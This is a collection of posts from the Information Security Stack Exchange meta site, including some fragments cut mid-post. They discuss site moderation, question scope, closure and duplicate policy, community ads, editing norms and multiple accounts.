<p>To quote a relevant question from <a href=""https://workplace.meta.stackexchange.com/q/1692/9549"">The Workplace</a> (emphasis added)</p>

<blockquote>
  <p>It's way too easy to post ""<strong>quit your job</strong>"" as an answer, and almost every post on our site could be answered in this manner.</p>
</blockquote>

<p>Replace <em>quit your job</em> with <em>don't roll your own crypto</em> and the situation is almost identical.</p>

<p>Possible ways to answer a question:</p>

<ul>
<li>This can be broken by doing [X]. Use [Y] instead, and don't roll your own crypto.</li>
<li>Don't do that. Use [Y]. Don't roll your own crypto.</li>
<li>This can be broken by doing [X]. To avoid this, use [A] and [B] but that could leave an opening for [C], depending on the moon cycle. Use [Y] instead to be safe, and don't roll your own crypto.</li>
</ul>

<p>Frankly the last phrase in all three can be replaced with ""may the Force be with you"" and the result will still be the same: The OP will (hopefully) use [Y] untill he comes up with the next brilliant idea. He will then probably ask about it here, get told not to roll his own crypto again and think ""boy I must be useless - I think I don't like security after all"".</p>

<p>We need people in security, we need people rolling their own crypto. Telling people off isn't doing anyone any good in the long run.</p>

<h3>What are Community Promotion Ads?</h3>

<p>Community Promotion Ads are community-vetted advertisements that will show up on the main site, in the right sidebar. The purpose of this question is the vetting process. Images of the advertisements are provided, and community voting will enable the advertisements to be shown.</p>

<h3>Why do we have Community Promotion Ads?</h3>

<p>This is a method for the community to control what gets promoted to visitors on the site. For example, you might promote the following things:</p>

<ul>
<li>cool security related open source apps</li>
<li>the site's twitter account</li>
<li>cool events or conferences</li>
<li>anything else your community would genuinely be interested in</li>
</ul>

<p>The goal is for future visitors to find out about <em>the stuff your community deems important</em>. This also serves as a way to promote information and resources that are <em>relevant to your own community's interests</em>, both for those already in the community and those yet to join. </p>

<h3>Why do we reset the ads every year?</h3>

<p>Some services will maintain usefulness over the years, while other things will wane to allow for new faces to show up. Resetting the ads every year helps accommodate this, and allows old ads that have served their purpose to be cycled out for fresher ads for newer things. This helps keep the material in the ads relevant to not just the subject matter of the community, but to the current status of the community. We reset the ads once a year, every December.</p>

<p>The community promotion ads have no restrictions against reposting an ad from a previous cycle. If a particular service or ad is very valuable to the community and will continue to be so, it is a good idea to repost it. It may be helpful to give it a new face in the process, so as to prevent the imagery of the ad from getting stale after a year of exposure.</p>

<h3>How does it work?</h3>

<p>The answers you post to this question <em>must</em> conform to the following rules, or they will be ignored. </p>

<ol>
<li><p>All answers should be in the exact form of:</p>

<pre><code>[![Tagline to show on mouseover][1]][2]

   [1]: http://image-url
   [2]: http://clickthrough-url 
</code></pre>

<p>Please <strong>do not add anything else to the body of the post</strong>. If you want to discuss something, do it in the comments.</p></li>
<li><p>The question must always be tagged with the magic <a href=""/questions/tagged/community-ads"" class=""post-tag moderator-tag"" title=""show questions tagged &#39;community-ads&#39;"" rel=""tag"">community-ads</a> tag. In addition to enabling the functionality of the advertisements, this tag also pre-fills the answer form with the above required form.</p></li>
</ol>

<h3>Image requirements</h3>

<ul>
<li>The image that you create must be <strong>220 x 250 pixels</strong></li>
<li>Must be hosted through our standard image uploader (imgur)</li>
<li>Must be GIF or PNG</li>
<li>No animated GIFs</li>
<li>Absolute limit on file size of 150 KB</li>
</ul>

<h3>Score Threshold</h3>

<p>There is a <strong>minimum score threshold</strong> an answer must meet (currently <strong>6</strong>) before it will be shown on the main site.</p>

<p>You can check out the ads that have met the threshold with basic click stats <a href=""https://security.meta.stackexchange.com/ads/display/1457"">here</a>.</p>

I certainly understand your frustration, and have felt it before myself when I've had, what I thought were, legitimate questions closed or down voted.</p>

<p>Keep in mind that the StackExchange sites are the best Q&amp;A sites out there because there is such strict moderation by both official mods and the community.  Because of this you are able to find high quality answers quickly instead of wading through the BS you see on other Q&amp;A sites.</p>

<p>If you disagree with the reasons for having your question deleted/closed you should bring that concern up on the meta sites to see if the rest of the community agrees with you.  This is really the best way that you might be able to influence the direction of the sites. </p>

It therefore was deleted, with commentary from @RoryAlsop (plus a system-generated note) explaining why, because there was no foreseeable way to edit it into something which would match our format.</p>

<p>That your question appeared to be a product recommendation query is probably not the only reason it was closed or deleted, but unfortunately the system only displays the majority reason when a question is closed.</p>

<hr>

<p>Here are some issues that I see:</p>

<p><strong>Off-Topic: Product Recommendation</strong></p>

<p>The intent of this site is to host questions and answers which are <em>generally useful</em> to the Internet population at large, and which will remain so for a reasonable length of time. Asking for a specific product recommendation to fit your particular needs will most likely result in answers that are only really beneficial to you. Further, as technology does quickly progress - especially in the realm of computers, and even more so in the realm of security - answers to such questions quickly become out-dated.</p>

<p><strong>Primarily Opinion-Based</strong></p>

<p>Aside from the often subjective nature of product recommendations in general, you also asked for opinions on how certain systems measure up against one another. This is likely to result in a lot of discussion and debate amongst users, which is not what this site is intended for.</p>

<p><strong>Too Broad</strong></p>

<p>You question really was kind-of all over the place. At any given point in the post, you're asking one or more of several questions:</p>

<ul>
<li>Is anyone on here a Cisco reseller?</li>
<li>What firewall should I use?</li>
<li>What antivirus should I use?</li>
<li>What IPS should I use?</li>
<li>How can I implement a security solution, while maintaining maximum bandwidth, for 10 site-to-site VPN connections?</li>
<li>How does product X compare to product Y?</li>
</ul>

<p>These are way too many questions for one thread in the StackExchange format, and most of these questions wouldn't even be permitted if they were submitted individually anyway.</p>

<p><strong>Unclear What You Are Asking</strong></p>

<p>A comment on the question demonstrates that, even <em>if</em> Product Recommendation questions were on-topic, there was not sufficient information in the question for it to be properly answerable.</p>

<blockquote>
  <p>What's your traffic utilization look like? Peak/sustained/minimum bandwidth? Also be aware there are database-specific application firewall appliances out there, commercial and open source. It may make sense to purchase something small like a Fortigate 80c for the office, and a GreenSQL box for the server. –  RI Swamp Yankee</p>
</blockquote>

<hr>

<p>Generally, the first step for a question that doesn't appear to fit the StackExchange format is for it to be put on hold. This allows the asker an opportunity to clarify their needs and rephrase the question in a way that it can fit this site.</p>

<p>If a question remains on-hold for a certain duration, its status is changed to closed. Essentially, on-hold and close are the same thing. The on-hold term is just used initially to indicate that this question has a fair chance of being re-opened if modified quickly. Closed means that the asker has had a reasonable amount of time to modify it, but either has not cared to or has not been able to meet the StackExchange standards in that time.</p>

<p>In <em>either</em> situation - on-hold or closed - a question can be re-opened if it is changed to suit the StackExchange format. All it takes is a few votes from high-reputation users, or a single action by a moderator.</p>

<p>However, in extreme cases - like this one, where the question fits nearly every closure reason there is - a question may instead be deleted. This is reserved for a few, relatively rare, scenarios.</p>

<ul>
<li>The question is spam.</li>
<li>The question is hateful or abusive, and otherwise serves no constructive purpose.</li>
<li>Though not spam or offensive, there is no reasonable expectation that this question can be modified in a way to fit the StackExchange format and quality standards.</li>
</ul>

<p>Your question clearly fit the last of those scenarios. Part of the reasoning for this was explained in the close reason tagged to the question, and the comments. I hope I've more clearly outlined any other aspects which may have not yet been covered.</p>

<p>If anything is still unclear, I suggest perusing the <a href=""https://security.stackexchange.com/help"">Help Center</a>. There are many useful bits of information in there, including articles on how to ask a question here, what is and isn't on-topic, and reasons why questions may be closed and/or deleted. Browsing other questions on Meta, regarding question closure or deletion, may also be useful to you.</p>

In the famous <a href=""http://www.nethack.org/"" rel=""nofollow"">NetHack</a> game (not related to Information Security, despite the name), some people have found a way to enhance their characters to arbitrarily high levels, through a tedious process called <a href=""http://nethackwiki.com/wiki/Pudding_farming"" rel=""nofollow"">Pudding Farming</a>. Many NetHack players consider it to be somewhat of a cheat, and a debate on whether this should be disabled in the game mechanics has been triggered. A member of the fabled ""DevTeam"" (the people who come up with new NetHack versions, albeit not very often) have responded with the pearl of wisdom which, <em>mutatis mutandi</em>, tends to apply to the present hat situation equally well:</p>

<blockquote>
  <p>The DevTeam has arranged an automatic and savage punishment for pudding farming. It's called pudding farming.</p>
</blockquote>

<p>In plain words, hat-whoring is automatically punished through the tediousness of the operations needed to effectively hat-whore. In that sense, I agree with @Rory: as long as it does not break anything in the overall site mechanics, let it slide.</p>

<p>The difference with games on <strong>reputation</strong> (and badges) is that the rep count is permanent and is an element of what attracts users and keeps them active. Gaming the rep/badge system thus incurs what can be seen as permanent damage. Whereas all the hats will evaporate way before you begin to recover from New Year's hangover.</p>

<p>A question that requires specific tags such as <a href=""https://security.stackexchange.com/questions/tagged/tea"" class=""post-tag"" title=""show questions tagged &#39;tea&#39;"" rel=""tag"">tea</a> and <a href=""https://security.stackexchange.com/questions/tagged/feistel"" class=""post-tag"" title=""show questions tagged &#39;feistel&#39;"" rel=""tag"">feistel</a> is too specialized for this site. Questions on the design and implementation techniques of cryptographic algorithms are suitable for <a href=""https://crypto.stackexchange.com/"">Cryptography Stack Exchange</a>. Questions on the actual coding belong on <a href=""https://stackoverflow.com/"">Stack Overflow</a>. Your question is borderline; most questions on the Cryptography site contain math rather than code, but since your question is focuses on modifying the algorithm rather than on a coding issue, it is more suitable for Cryptography.</p>

<p>Be sure to use the proper formatting tool: despite its name, <code>&lt;code&gt;</code> is not a very good tag to use for code, since it doesn't format the content verbatim. Use 4-space indentation for literal formatting (as used by the <code>{}</code> button or the <kbd>Ctrl</kbd>+<kbd>K</kbd> shortcut), or <code>&lt;pre&gt;</code> tags. Pay attention to the preview below the editor window (which you've shrunk down to be practically empty, drag the bottom of the editor window up to make more room for the preview), make sure it comes out right. Another formatting tip: don't use bare URLs, hyperlink some English text, like <code>[TEA source from Wikipedia](http://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm)</code> (which renders as <a href=""http://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm"" rel=""nofollow noreferrer"">TEA source from Wikipedia</a>).</p>

<blockquote>
  <p>IT Security Stack Exchange is for Information Security professionals to discuss protecting assets from threats and vulnerabilities. Topics include, but are not limited to:</p>
  
  <ul>
  <li>web app hardening</li>
  <li>network security</li>
  <li>social engineering, including phishing</li>
  <li>risk management</li>
  <li>policies</li>
  <li>penetration testing</li>
  <li>security tools</li>
  <li>using cryptography</li>
  <li>incident response</li>
  <li>physically securing the office, datacentre, information assets etc.</li>
  </ul>
  
  <p>Questions on setting up your home PC antivirus may be more appropriate over at superuser.com; and questions on the deeper aspects of cryptography belong on crypto.SE.</p>
</blockquote>

<p>and from the Crypto faq:</p>

<blockquote>
  <p>Crypto Stack Exchange is for software developers, mathematicians and others interested in cryptography.</p>
  
  <p>Cryptography Stack Exchange is for asking questions about the mathematics and properties of cryptographic systems, their analysis (""cryptanalysis"") and subsidiary topics that generally make up cryptology, such as random number generation. As such, we welcome questions on topics such as:</p>
  
  <ul>
  <li>Asymmetric and symmetric cryptographic algorithms.</li>
  <li>Cryptographic protocols.</li>
  <li>Cryptanalysis techniques.</li>
  <li>Hash functions, hashing.</li>
  <li>Entropy and information theory.</li>
  <li>Random number generation.</li>
  </ul>
</blockquote>

<p>Here we don't worry about the algorithms, or the mathematics, or theoretical attacks on a set - we are focused on what those attacks might do to the enterprise we are trying to protect.</p>

<p>So if your question is about cryptography, in almost all cases you should ask on Cryptography.SE - the exceptions are when it comes to practical implementation, and then your question may be on topic here.</p>

<hr>

<p>When viewing message in Outlook 2013 (getting it's mail from Exchange 2013) there is an small link in near the header with ""Bing maps"" link. After clicking on that link the app does some thinking, emits a message like ""we think we found an address"", and then shows an embedded map of the address found.</p>

<p>Going to Outlook's <em>Manage Apps</em> page connects to the Exchange server where one can eventually find some info on the Bing Maps app, and enable/disable it. Under permissions it says </p>

<blockquote>
  <p>""When you click this app, it will be able to access limited
  information in the active message, such as phone numbers, postal
  addresses, or URLs in the message body or subject. The app may send
  this data to a third-party service.""</p>
</blockquote>

<p><img src=""https://i.stack.imgur.com/1qYyG.png"" alt=""Bing Maps app info from OWA""></p>

<p>My question is: Where exactly does the ""is this an address?"" calculation take place -- Outlook, local Exchange, Microsoft HQ, or undisclosed 3rd party service -- and what are the information and/or security risks associated with it?</p>

<p>My concern is that when clicking on this link the content of the message (and it's headers? and other messages in the thread? and my current location? ...?) is sent off premise, e.g. beyond our locally hosted and secured Exchange server to Somewhere Outside, perhaps many parties.</p>

<p>I'm just an end user, and have nothing to do with the our Exchange server. I'm not automatically against an app that (possibly) shares information externally. I just want to know how it functions, so I can decide for myself when it's appropriate to use or not use the feature. 99% of the time for my email it won't matter. However I have colleagues who deal with things like personal medical info of others for whom this might be a very big concern.</p>

<p>I respectfully disagree that it is ""common policy"".</p>

<p>The discussions linked to indicate there is actually significant <strong>debate</strong> about whether or not intros and outtros should be retained or edited out.</p>

<p>The balance appears to have tilted in favor of ""remove intros"", but IMO a significant contributing factor to that was that @Jeff Atwood (a StackExchange developer at the time) was opposed to intros/outtros <em>and</em> <a href=""https://meta.stackexchange.com/a/93989/258026"">able to action his preference</a> by making StackExchange remove common intro statements at the time of posting.</p>

<p>As benevolent dictator, this is/was his prerogative, but the community preference appears to have stopped short of ""edit out every intro/outtro that you see"". (I <em>think</em> - perhaps there is more aggressive editing on the busier sites).</p>

<p>I personally subscribe to the ""<a href=""https://meta.stackexchange.com/a/2956/258026"">accept intro/outtro removal if part of a wider edit to the post, reject if it is the only change</a>"" school of thought. My main concern is that new users (who are most likely to include intro/outtro remarks if they are trying to be polite, and politeness is a great thing and should be encouraged) will be put off by such editing.</p>

<p>Thanks and hope you have a great day!</p>

<p>*Yes, I have deliberately included an extended intro/outtro here in a possibly misplaced attempt at humour.</p>

I will argue it is not. How about removing the ""duplicate"" label?</p>

<p>Why do I even care? Friends, I enjoy and appreciate Stack Exchange. But my biggest problem with it bothers me. It is that generally I don't feel the love. I'm not free from emotions about this.</p>

<p>In the latest instance, I attempted to benefit myself and the Information Security Stack Exchange community by asking a relevant question to which I, and I presume others, would like to know the answer. First I searched for similar questions and read their answers. I found that I still did not have the understanding that I was seeking.</p>

<p>So I asked <a href=""https://security.stackexchange.com/questions/55550/does-https-retrieval-among-its-other-effects-sign-a-document"">whether SSL/TLS implies that the transported document becomes signed</a>. After a while, one person described a counterexample. Good. That's what I call an answer.</p>

<p>As I hope we all expect, this counterexample to the (thereby demonstrated false) claim that HTTPS signs documents is a specific scenario in which the document does not meet a criterion that we'd all call ""being signed."" As I'll state it here, the criterion is that the document must have a durable proof that someone has marked the document:</p>

<ol>
<li>that has the purported contents</li>
<li>in a way that only the purported signer is expected to be able to do.</li>
</ol>

<p>As usual with PKI, the scheme falls down if private keys don't stay private. OK, you can make the usual arguments for biometrics, etc., but that won't contribute very much to this particular discussion.</p>

<p>I didn't like what happened meanwhile. Various observations toward dismissing the question came up. I answered them. The question was downvoted. The question is now marked as a duplicate of <a href=""https://security.stackexchange.com/questions/20803/how-does-ssl-work"">how SSL/TLS works</a>.</p>

<p>I am saying that it's not. I am saying that the counterexample is more than a statement of the criterion for being a signed document and more than a definition of SSL/TLS.</p>

<p>In case we're not all convinced, I offer an analogy. Suppose I had asked ""Do there exist integers a b c each greater than zero and an integer n greater than two such that a^n + b^n = c^n?"" Would I be duplicating ""What are the usual axioms of arithmetic?"" The fact that there are no such a b c and n is a consequence of those axioms and nothing more. Once the question was asked, it took just under 360 years for someone to explain how those axioms justify that consequence. Now that a few more years have gone by, there is more than one person in the world who understands how - possibly dozens of people!</p>

<p>Logical consequences are not generally obvious from the relevant definitions.</p>

<p>Fortunately my question isn't nearly as subtle as Fermat's Last Theorem. How subtle is it? I asked an intelligent person, who crucially is an undergraduate student not an established expert, whether after reading the answers to how SSL/TLS works he now knows whether SSL/TLS signs a document. After all, an expert would know the answer without bothering to read anything more about how SSL/TLS work. This undergraduate student did not know.</p>

<p>He was happy to argue that SSL/TLS is a bad way to attempt to sign a document. Yes indeed, I agree. If anyone wants to sign a document, that person should just use a tool designed for that purpose, such as GPG. But that wasn't what I was asking. And he did not know how to justify a claim either that SSL/TLS is not an effective way to sign a document or that it is an effective way.</p>

<p>Can we agree that the answer to my question is not simply obvious to everyone who has referred to the other question?</p>

</blockquote>

<p>Or</p>

<blockquote>
  <p>You might find answers to your question in...</p>

1570,2,2014-06-15T14:36:28.160,6,,"<p>The rejection reason “too minor” was introduced for several reasons:</p>

<ul>
<li>Edits bump a post on the home page, giving the thread more attention. This is desirable in case something major has changed, but not to fix a typo.</li>
<li>Suggested edits cost time for the reviewers.</li>
<li>Each edit used to bring the post closer to community wiki status — but as you note this is no longer the case.</li>
</ul>

<p>The third reason no longer applies. The second one does, but only to a small extent: manpower for suggested edit review used to be scarce on Stack Overflow, but now it is no longer, and it never was to my knowledge on any other Stack Exchange site. The first reason still applies, but it isn't a big deal unless a lot of minor edits happen (and it's a big deal even for major edits if there are a lot of them).</p>

<p>There's been much debate lately on <a href=""https://meta.stackexchange.com/"">Meta Stack Exchange</a> and <a href=""https://meta.stackoverflow.com/"">Meta Stack Overflow</a>, with opinions ranging from generic frustration against suggested edits to wanting to do away with “too minor” altogether. Given the complete lack of consensus, don't expect the reason to disappear or change.</p>

<p>I only use “too minor” in a few cases:</p>

<ul>
<li>The suggestion isn't really an improvement, it's only cosmetic. For example, an edit that standardizes a post that mixes British and American spellings (on a site other than ELU or ELL, where that can be important).</li>
<li>The suggestion corrects a few problems but there are many other glaring problems. For example, an edit that fixes the spelling of one word while leaving many other grammatical mistakes, or an edit that removes an inappropriate tag but doesn't add other tags that the question sorely needs.</li>

Furthermore the question has had a satisfactory answer. We would only migrate a question away if it was off-topic, or at least if it was borderline, more off-topic elsewhere and unlikely to be satisfactorily answered here.

<p>Some questions I've posted have been well-received and given informative, helpful answers.

<p>In between the fact-based and the opinion-based are things I might categorize as ""newbie"" -- things that are valid technical questions pertaining to security, but which might be rejected as too basic, or perhaps seen as bordering on technical support. For instance (examples only, not actually asking these here):</p>

<ul>
<li><p>Analysis of system logs where some entries are suspicious to an untrained eye, and actual suspect entries (to someone more experienced) may not occur to the questioner. Posting a gist to ask, does anyone see cause for alarm given possible threat X? Maybe sometimes this is legit, but other times might be asking for help in a too broad hunt. </p></li>
<li><p>Questions about making sense of traffic with wireshark or netstat, or even strategies for digging through noisy data. (Or for that matter, help with these tools that seems to not be clearly explained in the man pages.) RTFM is good idea, but it doesn't answer everything and as is often true of manuals, can provide too much info to wade through for someone new to using the tool. </p></li>
<li><p>Questions about exploit vectors, their prevalence in the wild, and when greater security would apply for a specific type of attack (as in, when the target is more valued than random attacks). </p></li>
<li><p>Broad questions that are by nature somewhat subjective, like which browsers are safer against certain types of threats. </p></li>
</ul>

<p>I imagine some or all of these being not appropriate for the InfoSec StackExchange, so would like to know where else I might get community answers, or how I might better frame these as appropriate questions.</p>

As a result, vote counts on Hot Network Questions can be pretty dubious and don't always reflect the Security.SE community's views; votes from new folks can outnumber votes from our own active members.  So, the votes on these questions aren't always reliable, and the answers aren't always reliable, either.</p>

<p>I've noticed that a bunch of the questions I've seen featured on Hot Network Questions have been what I would consider to be lower-quality: they did not show much evidence of prior research, many were duplicates or were a variant of something that had been previously asked, and they might be about something of broad interest but that maybe an information security professional would likely already know.</p>

<p>So, I think these might be isolated cases that don't necessarily reflect the rest of the questions on this site.  I'm not convinced we need to change the tour page, create two sites, change the scope, or anything like that.  Overall, things seem to be working pretty well, apart from these exceptional cases caused by Hot Network Questions.</p>

<p>There's not a lot we can do about the effects of questions being featured in Hot Network Questions.  About all we can do is try to moderate these questions rapidly: vote on them; if they need to be closed, place appropriate close votes; when there are many answers encourage moderators to clean things up and delete answers that don't add much (e.g., by flagging the poor/incomplete answers for deletion, even if they have some upvotes), etc.</p>

<p>One thing you can do: if you see a Hot Network Question that has attracted poor answers from drive-by users, please flag it for moderator attention and ask the moderators to protect the question.  This will ensure that the question can only be answered by users who have earned >= 10 reputation points on this site.  This situation is exactly the sort of thing that protected questions were <a href=""https://meta.stackexchange.com/a/212835/160917"">designed to solve</a>.</p>

<p>I would love to see a site more aimed at Infosec professionals, but I think this is unlikely to happen. A flow of more basic questions gives a reassuring volume of traffic (but are there too many dupes?). The most likely fix is to rebrand slightly, perhaps ""a site for Information Security discussion"".</p>

<p>Something that exacerbates the problem is that questions of a professional nature tend to get closed as ""too broad"" or ""opinion based"". This has frustrated me a few times and is something the mods could easily change.</p>

<p>Another change we could make now is for high-rep users to upvote more on these kinds of questions. Many high-rep users do not vote all that much. I do wonder if votes from  high-rep users should actually count for more - but this is a SE change that I expect is unlikely to happen.</p>

<p>Many high-rep users say ""don't worry about rep"" but I think that is a bit of a cop-out. SE is designed to be all about rep - it's always shown next to your name. The reality is that rep is not all that accurate - but it's the best anyone can come up with. SE is very effective at being an online community that is better than mailing lists - and that's why I stick around.</p>

<p>I notice some high-rep users are very adept at playing the rep game. They understand what questions will be popular and write popular answers. Fair play to them - but I do wonder if there are perverse incentives here. Sometimes the right thing to say is not the popular thing.</p>

<p>Given this, would it make sense to have a curated list (perhaps managed by the moderators) that would essentially be an FAQ list of some of the most common questions with pointers to existing threads on the site that answer these questions that we could use as a first point of reference when we see potential duplicates?

1598,2,2014-08-04T16:15:47.097,3,,"<p>In my experience, having a big list of canonical questions isn't very manageable. Tagging questions as <a href=""https://security.stackexchange.com/questions/tagged/canonical"" class=""post-tag"" title=""show questions tagged &#39;canonical&#39;"" rel=""tag"">canonical</a> or some such (the way meta questions are tagged <a href=""https://security.stackexchange.com/questions/tagged/meta-faq"" class=""post-tag"" title=""show questions tagged &#39;meta-faq&#39;"" rel=""tag"">meta-faq</a>) isn't very nice either because each question then stands individually. It's better to have questions organized by topic.</p>

<p>Fortunately, Stack Exchange already has a way to classify questions by topics: with tags. And tags have a place for canonical questions: <strong>the tag wiki</strong>.</p>

<p>If you think a thread covers an important aspect of a topic, and in particular if it's a good potential target for duplicate closure, add it to a list in the tag wiki for the tag that best describes the topic.</p>

<p>You can build up lists of existing canonical question by looking at the most-upvoted questions in a tag. Don't blindly take the <a href=""https://security.meta.stackexchange.com/questions/1585/are-the-wrong-questions-and-answers-getting-too-many-upvotes"">most-upvoted questions</a> though: sometimes the questions cover overlapping questions and are redundant, sometimes the questions are popular trivia of little general interest, etc. The votes are a hint but are not what intrinsically makes a question canonical. Also the canonical question lists should only list questions with a good answer.</p>

<p>On <a href=""https://unix.stackexchange.com/"">Unix &amp; Linux</a>, I try to maintain lists of common questions in tag wikis (but these lists aren't nearly complete or ubiquitous).

<p>In order to work, they need to be moderated more than the average question. This goes both for the questions and for the answers.</p>

<li>Questions should explain what the asker wants to do — not just “what's the best vulnerability report compiler?” but “I want a tool to help me categorize and prioritize vulnerabilities and collect findings into an organized presentation. I do penetration tests on web servers. The tool should take this kind of inputs and produce this kind of outputs.”</li>
<li>Answers should not just mention a tool without explanation, they should be tailored to the requirements in the question. If you can imagine your answer copied word-for-word on another question, you're doing it wrong.</li>

Enforcement is important — if an answer doesn't have any explanation, even if it's massively upvoted because it's a popular tool, we'll delete it.</p>

<p>Does Software Recommendations Stack Exchange work? In my opinion (I'm a moderator there), it works in terms of keeping the spam and the crud out. It doesn't work all that well in producing quality answers — we cull the bad ones (as well as the questions that don't call for answers with added value) but we do have a problem getting good ones. I think that in terms of moderation, SR.SE is successful, but in terms of producing answers — which is what it's all about — it's less than optimal. It would be best if the SR.SE questions were shown to the respective experts (on Stack Overflow, Super User, Server Fault, Security, etc.).</p>

<p>I'd like to avoid a blanket ban on anything that looks like a tool recommendation. If a question <strong>asks how to solve a problem</strong> and a valid answer happens to be “use this existing tool”, so be it.</p>

1601,2,2014-08-06T17:09:18.380,4,,"<p>MathOverflow and Math SE are a special case. For those who are unfamiliar: anyone can create an account on MO, but in practice, the community is largely restricted to research mathematicians (think people who have doctorates in mathematics and work at universities); on the other hand, Math SE is more of a ""typical"" SE site.</p>

<p>MO was originally started as a Stack Exchange 1.0 site, in the days before Area 51 existed. The SE 1.0 system, in a nutshell, allowed anyone with enough money to buy a copy of the SE software and start a Q&amp;A site about any topic. Most of the sites that were started in the SE 1.0 days failed; MO is one of the few exceptions. After some discussion on both sides, we eventually worked out a way for them to join the current network, but by that time, Math SE already existed.</p>

<p>The point of this short history lesson is that MO and Math SE shouldn't be used as a model for other sites. We really don't like the idea of splitting up a topic into ""the experts"" and ""everyone else."" Aside from having an uncomfortable elitist vibe, that hurts the chances for most people to get good answers.</p>

<p>Instead, we try to have the best of both worlds by creating sites that are aimed at experts, but accept questions from just about everyone, as you surmised. (On a related note, we've actually stopped using ""professionals"" in new proposal and site descriptions.) In our experience, experts are generally happy to help non-experts interested in their fields, as long as they're not completely clueless. We've also found that experts don't need 100% of the questions on a site to be super-expert-level for them to stick around; the number just needs to be significant.</p>



<p>If you don't want the tour and other pages to say ""professionals,"" please post a separate feature request. Note that many new users don't actually read that page, so the impact of the change will be limited.</p>

Or I thought the answerer did a good job and wanted to encourage him to continue offering what he can to the community. Maybe others did damn well, but I only have so many upvotes to give in a day. Perhaps it received negative votes from others who didn't explain why, or were unnecessarily harsh, and I thought I could help the answerer improve his offering.</p>

<p>I don't see how these kinds of circumstances don't warrant a comment upon upvoting just like it's important to leave a comment when you downvote to give the author an opportunity to improve his answer, or at the very least do better in the future. When you downvote and take away someone's rep, they deserve to know why (assuming someone else hasn't already told them). On rare occasions, the answerer you're rewarding and/or the answerers you passed over deserve to know why, too.</p>

In regards to the 'first posts' and 'late posts' in particular, I feel that if the reviewer(s) did their job adequately, we would not see so many downvotes on first time users questions. We still might see some but the basic errors of; </p>

<blockquote>
  <p>*""Hi my name is ... and I wanted to know ... any help would be greatly appreciated, thanks! </p>
  
  <p><em>""I love security! I love this site! Go Eagles!""</em></p>

  <p><em>""What is the best security tool?""</em></p>
</blockquote>

<p>would be largely absent. </p>

<p>At the time of this posting, there are two questions asked within a few hours with 6 downvotes. I feel this is a shortcoming of the reviewers. Further, I think at least some of that shortcoming may spring from the fact that reviewers may seem rushed to perform a review task before someone else (for some reason humans are motivated by virtual badges).</p>

<p>I propose that for some or all of the review tasks, we impose a timed-lock of sorts to allow the reviewers to actually take the time needed to read and correct the posts. Something as simple as a message saying, ""This post currently being reviewed. Your review will be queued second and used if the original reviewer does not finish."" may work just fine.</p>

<p>Programmatically (I'm a programmer by trade), it could be implemented by storing the 'queued' reviews in a table or cache until needed or not needed (if not needed, then deleted from the cache/table). I assess this to be of little programming impact with potentially higher quality posts.</p>

<p>And we may already be implementing a lock just behind the scenes. If so, I say we peel back the veil...</p>

<p>This is in fact why we have the voting system on Stack Exchange, and why it allows down votes as well as up votes.  It's a valuable piece of metadata to show what the community collectively feels about the value of any given post.   In many cases low quality posts with many down votes <em>do</em> end up being closed or deleted, or otherwise cleaned up, but that should not necessarily be a step of first resort.  The voting mechanisms allow a number of users to weigh in first, which ultimately results in our retaining the highest quality content.  Because of this, I really wouldn't want a system that front-loads moderation to an extent that substantially eliminates the input of the community.  </p>

<p>The accepted answer is the one that shows up at the top of the answer list for visitors. It's generally best to accept the answer that provides the best overview of the topic. The choice of accepted answer influences how all visitors will perceive the thread.</p>

<p>Some bounties are naturally awarded to the accepted answer, if it provides exceptionally good coverage of the topic or a clever, useful solution.

'Sock Puppets' are seriously frowned upon on Stack Exchange, and in fact the sock detection tools are very effective at finding them and deleting them, as are members of the community.</p>

<p>That said, as long as you do not let the two accounts interact with each other, there is no ethical problem here, and we do indeed have members who do exactly this, using different accounts for different purposes.</p>

  opinions, etc knowing full-well that the question will be closed
  within a few hours (and perhaps even their account flagged/etc). That
  user asks this question because he/she has a good chance that some
  person will answer the question with their opinion (perhaps even if
  they voteDown/flag the question). The user continues to repeat this
  process because although the questions are getting flagged/closed, the
  user is still getting what they want (albeit in a crude way).</p>

<p>There's a reason why those type of questions were judged off-topic and let's face it, for example questions about product recommendations get outdated very quickly. Also most of the time, those questions can be answered quite easily by using Google.</p>

<p>It is often harmful to close, and not delete, old questions which already have helpful answers.

Deleting them is often even more unhelpful, as a waste of admin energy, a source of needless debate, and a loss of useful information.</p>

<p>The appropriate action is to improve the question with edits which demonstrate best practice, by making sure it is clear just what the requirements are for the tool, so that there is a good answer.  When there is a good accepted answer, such edits should typically make it so that the question matches the answer.</p>

1646,2,2014-09-08T23:09:22.110,8,,"<p>Guilty, so here are my thoughts.</p>

<p>Let's keep this in mind: so far, every single flag I've raised has been labeled as ""helpful"" which means that these questions were indeed off-topic.</p>

<p><strong>Why not just leave these questions alone?</strong></p>

<p>We have a review queue about this and it's called ""Late Answers"". For example, so far today there were 3 late answers which means that eventually, someone will post in one of them (<em>them</em> being the off-topic questions) when the question itself should be closed in the first place.</p>

<p>Neal suggested to edit these questions and to be fair, most of them seem irrecuperable because they are blatantly requesting for X product doing Y. Also, like I said in the comments, it would also bring them up in the feed, which is what we probably want to avoid.</p>

<p><strong>Is there a written rule against this?</strong></p>

<p>As far as I know, nope (feel free to correct me if I'm wrong). </p>

<p>Also, what also makes me believe that this is not wrong is that we can a maximum of up to <a href=""https://meta.stackexchange.com/questions/185888/on-the-recent-changes-to-flagging-and-limits/185890#185890"">100 flags per day!</a> Therefore, I do not see why one should be refrained from flagging many questions in a somewhat short length of time.</p>

<p>Now about flagging old questions, if this is inappropriate, why are we able to do so then? Simply because it does not mean that it's a good and/or appropriate question because it never got flagged.</p>

<p><strong>There has to be something negative this could cause, right Mr. Simon?</strong></p>

<p>Sure, it fills up the queue with questions that don't need immediate care. Therefore, if you flag a bunch of questions, a newer question might not be reviewed because the reviewers maxed out their review cap (I feel like I should stop typing ""review""). That, indeed, can cause trouble.</p>

<p><strong>What should be the proper behavior?</strong></p>

<p>Well, as suggested by the almighty @AviD in the chat, flagging a few questions at a time to avoid filling up the queue is probably the best way to act. Personally, I'm still unsure if we should edit these questions at all considering that most of them seem to be a lost cause.</p>

1647,2,2014-09-12T07:49:12.557,5,,"<p>To complete @Rory's answer: what is frowned upon is the specific action of <em>sock-puppeting</em>, where you have multiple accounts on the same site <em>and</em> you abuse the ""game rules"" with the coordinated action of these multiple accounts. As the powers-that-be on SE say it, it is OK to have multiple accounts as long as ""they don't vote for each other, and they don't vote for the same thing"". To be really separate, you may also refrain from voting with one account on a question where another of your accounts provided an answer, though that case would not be deemed sock-puppeting.</p>

